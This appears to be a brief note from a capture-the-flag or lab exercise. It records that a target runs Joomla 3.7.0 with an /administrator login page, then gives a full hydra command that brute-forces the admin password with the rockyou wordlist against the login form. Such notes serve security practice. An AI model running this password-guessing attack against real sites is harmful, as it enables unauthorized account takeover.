We know it is using joomla 3.7.0 


we have a login page at /administrator




---

using hydra to brute force admin password?

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt $10.10.206.115 http-post-form "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login&return=aW5kZXgucGhw&936112e26bb1f73f3da72a4144185466=1:Username and password do not match or you do not have an account yet."
```

